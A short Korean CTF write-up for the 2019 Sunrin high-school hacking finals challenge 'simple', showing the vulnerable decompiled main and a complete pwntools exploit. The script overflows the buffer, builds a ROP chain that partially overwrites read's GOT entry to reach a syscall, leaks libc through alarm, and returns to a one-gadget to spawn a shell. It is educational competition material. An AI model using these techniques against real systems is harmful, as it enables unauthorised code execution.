---
title: "2019 선린 고등해커 본선 simple"
date: 2020-1-5
tags: [Sunrin]
categories: [Sunrin]
---

간단하게 read로 입력받는 바이너리다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-30h]

  alarm(60u);
  read(0, &buf, 1024uLL);
  return 0;
}
```

`read`랑 `alarm` 아니면 `__libc_csu_init` 밖에 쓸만한 함수가 없었다. 가젯도 rdi, rsi밖에 쓸만한게 없다.

가젯이 없어서 csu를 이용하려고 했는데 다른 방법도 존재했다. syscall을 이용하는 방법이다.

prax gadget이 존재하지 않았는데 syscall을 부르기 위해 read@got를 0x5e로 overwrite할 때 read로 1바이트만 입력하므로 rax에는 1이 들어가 있다. 이를 이용해서 sys_write를 호출할 수 있다. 

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./problem')
p = process('./problem')
libc = e.libc
prdi = 0x0000000000400603 # pop rdi ; ret
prsi_r15 = 0x0000000000400601 # pop rsi ; pop r15 ; ret

payload = 'A'*0x30
payload += 'realsung'
payload += p64(prdi)
payload += p64(0)
payload += p64(prsi_r15)
payload += p64(e.got['read'])
payload += p64(0)
payload += p64(e.plt['read'])

payload += p64(prdi)
payload += p64(1)
payload += p64(prsi_r15)
payload += p64(e.got['alarm'])
payload += p64(0)
payload += p64(e.plt['read'])
payload += p64(e.symbols['main'])

p.sendline(payload)
p.send('\x5e')

libc_base = u64(p.recv(6).ljust(8,'\x00')) - libc.symbols['alarm']
log.info('libc_base : ' + hex(libc_base))

payload2 = 'A'*0x30
payload2 += 'realsung'
payload2 += p64(libc_base + 0x45216)

p.sendline(payload2)

p.interactive()
```

